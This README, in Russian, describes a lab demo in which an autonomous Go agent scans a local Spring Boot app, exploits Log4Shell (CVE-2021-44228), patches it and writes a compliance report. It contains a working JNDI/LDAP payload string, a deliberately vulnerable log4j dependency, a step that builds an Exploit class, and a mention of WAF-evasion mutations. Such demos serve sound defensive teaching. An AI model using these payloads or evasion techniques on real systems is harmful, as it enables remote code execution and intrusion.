# 🤖 AEON ARSENAL: Autonomous Reactive Pentest Agent

*Read this in other languages: [English](README.en.md), [Русский](README.md).*

> **Изолированный демонстрационный стенд автономного рефлексивного агента-исполнителя (Go/Java)**

[](https://golang.org)
[](https://openjdk.org)
[](https://maven.apache.org)
[](LICENSE)

---

## 🧭 Общие сведения

**AEON ARSENAL** — это программный комплекс, демонстрирующий **100% автономный замкнутый цикл (Sense-Think-Act)** выявления, проверки, эксплуатации, автоматического исправления (*Self-Healing / Auto-Remediation*) и комплаенс-отчетности для критической уязвимости **Log4Shell (CVE-2021-44228 / БДУ ФСТЭК:2021-06103)**.

Стенд развертывает локальное веб-приложение на базе **Java Spring Boot**, встроенный **LDAP TCP Callback Listener** и когнитивное ядро **Go-агента**, принимающего решения в условиях частичной наблюдаемости внешней среды (*Partially Observable Markov Decision Process — POMDP*).

```mermaid
graph TD
    subgraph "СЕНСОРНЫЙ АНАЛИЗ (Sense)"
        A[Внешние отклики / TCP-коллбеки] --> B(Обновление Базы Знаний)
    end
    subgraph "КОГНИТИВНОЕ ЯДРО (Think)"
        B --> C{Вычисление Utility Policy}
        C -->|Рефлексивный вывод| D[Выбор эффектора из реестра]
    end
    subgraph "ИСПОЛНЕНИЕ (Act)"
        D --> E[Выполнение Tool.Execute]
        E -->|Воздействие| F((Java Spring Boot Target))
        F -.->|Обратный канал OOB| A
    end
    
    style B fill:#111,stroke:#00ADD8,stroke-width:2px;
    style C fill:#111,stroke:#ED8B00,stroke-width:2px;
    style F fill:#222,stroke:#C71A36,stroke-width:3px;
```



---

## 🛠️ Техническая архитектура и компоненты

Программная структура агента разработана в соответствии с принципами чистой архитектуры (*Hexagonal Architecture / Ports and Adapters*), SOLID и TDD:

* **[cmd/agent/main.go](cmd/agent/main.go)** — Точка входа. Управляет жизненным циклом фоновых процессов и координирует запуск горутины агента.
* **[internal/agent/agent.go](internal/agent/agent.go)** — Когнитивный контур. Реализует управляющий цикл и решающее правило выбора стратегии `Think()`.
* **[internal/core/model.go](internal/core/model.go)** — Потокобезопасная база знаний (`KnowledgeBase` / LTM) на базе `sync.RWMutex`.
* **[internal/core/effector.go](internal/core/effector.go)** — Интерфейс `Tool` для эффекторов.
* **[internal/effectors/](internal/effectors/)** — Реестр полиморфных эффекторов (инструментов):
  * `ToolPortScanner` — Разведка сетевого периметра.
  * `ToolDiscovery` — Поиск точек сочленения и векторов ввода (`X-Api-Version`).
  * `ToolPayloadGenerator` — Синтез сигнатурного вектора JNDI.
  * `ToolProber` — Проверка уязвимости методом внеполосной (Out-of-Band) трассировки.
  * `ToolSemanticFuzzer` — Обход классификаторов фильтрации (WAF Evasion) с помощью вложенных синтаксических мутаций.
  * `ToolRemediator` — Автоматический патчинг.
  * `ToolReporter` — Формирование отчета в соответствии с ГОСТ Р 56939-2016.
* **[pkg/oob/](pkg/oob/)** — Out-of-band слушатели (LDAP и HTTP).
* **[pkg/target/](pkg/target/)** — Управление жизненным циклом и перезапуском локальной Java-цели.
* **[deployments/](deployments/)** — Конфигурационные файлы для развертывания (Docker, Compose).
* **[test/vulnerable-app/](test/vulnerable-app/)** — Уязвимое тестовое Java Spring Boot приложение.

---

## 🎯 Спецификация когнитивного цикла (Think-Act Loop)

Математическая модель принятия решений агентом оперирует на дискретном пространстве состояний среды $S$ и множестве доступных действий (инструментов) $A$. Для каждого инструмента рассчитывается апостериорный показатель эффективности:

$$EfficiencyScore = \frac{SuccessCount}{UsageCount}$$

### Пошаговый сценарий работы стенда:

| Шаг | Выбранный Инструмент | Действие и физика процесса | Изменение Belief State |
| :--- | :--- | :--- | :--- |
| **1** | `port_scanner` | Проверка TCP-сокета хоста `:8080`. | Обнаружен открытый HTTP-порт веб-службы. |
| **2** | `discovery` | Выполнение GET-запроса, парсинг DOM и заголовков. | Идентифицирован вектор ввода: заголовок `X-Api-Version`. |
| **3** | `payload_generator` | Синтез базового эксплоит-вектора. | База данных пополняется строкой `\${jndi:ldap://127.0.0.1:1389/Exploit\}`. |
| **4** | `prober` | Первичная атака. Агент отправляет полезную нагрузку. | Встроенный LDAP-слушатель фиксирует входящее TCP-соединение на порт `1389`. Выявлен факт RCE. |
| **5** | `remediator` | Автоматическое исправление. Запись флага в `remediation.properties` и перезапуск JVM. | Процесс Spring Boot перезапущен с флагом `-Dlog4j2.formatMsgNoLookups=true`. `PatchApplied = true`. |
| **6** | `prober` | Верификация (повторный зондирующий запрос). | Ожидание OOB-соединения на порту `1389`. Соединение отсутствует $\rightarrow$ `PatchVerified = true`. |
| **7** | `reporter` | Генерация markdown-отчета. | Документ `reports/cve_2021_44228_report.md` сформирован. `ReportGenerated = true`. |
| **8** | `stop` | Терминация. | Завершение работы. |

---

## 📦 Спецификация уязвимого Java-приложения

Приложение-цель в директории `test/vulnerable-app/` представляет собой минимальный REST-сервис на базе **Spring Boot 2.7.18** с намеренно заниженными версиями библиотек **Apache Log4j2**:

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version> <!-- Уязвимая версия, поддерживающая lookup JNDI -->
</dependency>
```

Уязвимый контроллер логирует входящие HTTP-заголовки без предварительной очистки:
```java
logger.info("[AUDIT] API Version header logged: {}", apiVersion);
```

При получении строки вида `\${jndi:ldap://...\}` логгер инициирует резолв JNDI-адреса, отправляя запрос по протоколу LDAP на порт `1389`.

---

## 🚀 Инструкция по запуску

### Предварительные требования
* **JDK 17+** (проверьте через `java -version`)
* **Maven 3.8+** (проверьте через `mvn -version`)
* **Go 1.21+** (проверьте через `go version`)

### 1. Сборка Java-микросервиса
Скомпилируйте Java-цель в толстый JAR-артефакт:
```bash
cd test/vulnerable-app
mvn clean package
cd ../..
```
*Убедитесь, что в директории `test/vulnerable-app/target/` успешно создался файл `vulnerable-app-simple-1.0.0.jar`.*

### 2. Сборка Exploit payload
Скомпилируйте Java Exploit класс, который будет раздаваться HTTP-сервером:
```bash
javac internal/payload/Exploit.java
```

### 3. Компиляция и запуск демонстрационного стенда
Запуск в режиме интерпретации Go на лету:
```bash
go run ./cmd/agent
```

Или выполните компиляцию в исполняемый бинарный файл:
```bash
go build -o test_agent ./cmd/agent
./test_agent
```

---

## 📊 Пример консольного вывода

```text
=== ДЕМОНСТРАЦИОННЫЙ СТЕНД ИЗОЛИРОВАННОГО РЕАКТИВНОГО АГЕНТА (JAVA SPRING TARGET) ===
[*] Запуск LDAP TCP-слушателя на порту :1389 для фиксации OOB Log4Shell вызовов...
[*] Запуск скомпилированного уязвимого Java Spring приложения...
[*] Ожидание инициализации веб-контекста Spring (3.5 сек)...
[*] Инициализация агента-исполнителя для цели: http://localhost:8080
================================================================
[ВЫВОД] Выбран инструмент: 'port_scanner' (Текущая фаза: Reconnaissance)
[ЭФФЕКТОР:port_scanner] Сканирование порта localhost:8080...
[НАБЛЮДЕНИЕ] OBSERVATION: Обнаружен открытый HTTP-порт localhost:8080. Java Spring Web-служба отвечает.

[ВЫВОД] Выбран инструмент: 'discovery' (Текущая фаза: Discovery)
[ЭФФЕКТОР:discovery] Исследование структуры веб-приложения http://localhost:8080...
[НАБЛЮДЕНИЕ] OBSERVATION: Обнаружены потенциальные векторы ввода: GET-параметр '/?input=' и HTTP-заголовок 'X-Api-Version'.

[ВЫВОД] Выбран инструмент: 'payload_generator' (Текущая фаза: Discovery)
[ЭФФЕКТОР:payload_generator] Анализ уязвимостей и синтез сигнатур...
[НАБЛЮДЕНИЕ] OBSERVATION: Сгенерирована сигнатурная нагрузка для CVE-2021-44228: '${jndi:ldap://127.0.0.1:1389/Exploit}'.

[ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Discovery)
[ЭФФЕКТОР:prober] Первичная атака: Отправка нагрузки '${jndi:ldap://127.0.0.1:1389/Exploit}' на http://localhost:8080...

[СЛУШАТЕЛЬ] >>> ПОЛУЧЕН ВХОДЯЩИЙ TCP-КОЛЛБЕК НА ПОРТ 1389 (Log4Shell подтвержден!) <<<
[НАБЛЮДЕНИЕ] SUCCESS: LDAP Callback получен на порту 1389 (Loot: FLAG{LOG4SHELL_EXPLOITED_SUCCESSFULLY}).

[ВЫВОД] Выбран инструмент: 'remediator' (Текущая фаза: Remediation)
[ЭФФЕКТОР:remediator] Анализ причин уязвимости и генерация исправления для http://localhost:8080...
[ЭФФЕКТОР:remediator] Перезапуск Java-приложения с флагом -Dlog4j2.formatMsgNoLookups=true...
[НАБЛЮДЕНИЕ] REMEDIATION_SUCCESS: Патч применен. Изменен параметр запуска JVM на '-Dlog4j2.formatMsgNoLookups=true'. Процесс успешно перезапущен.

[ВЫВОД] Выбран инструмент: 'prober' (Текущая фаза: Verification)
[ЭФФЕКТОР:prober] Верификация патча: Повторная атака уязвимости на http://localhost:8080...
[НАБЛЮДЕНИЕ] VERIFICATION_SUCCESS: Попытка эксплуатации отклонена сервером. Входящий TCP-коллбек на порт 1389 отсутствует. Уязвимость успешно устранена.

[ВЫВОД] Выбран инструмент: 'reporter' (Текущая фаза: Verification)
[ЭФФЕКТОР:reporter] Формирование отчета об уязвимости по стандартам РФ для http://localhost:8080...
[НАБЛЮДЕНИЕ] REPORT_SUCCESS: Отчет успешно сгенерирован и сохранен в файл 'reports/cve_2021_44228_report.md'.

================================================================
[INFO] Жизненный цикл аудита, патчинга и комплаенса завершен.
```

---

## 📜 Защита информации и комплаенс
Генерируемый агентом отчет в файле `reports/cve_2021_44228_report.md` учитывает ключевые российские стандарты ИБ:
* **ГОСТ Р 56939-2016** — Разработка безопасного программного обеспечения.
* **ФЗ-152** — Требования по защите персональных данных (ПДн) при обнаружении недекларированных возможностей.
* **ФЗ-187** — Обеспечение устойчивости объектов критической информационной инфраструктуры (КИИ РФ).

---

## 🛡️ Лицензия
Этот проект распространяется под лицензией **MIT**. Подробности в файле [LICENSE](LICENSE).
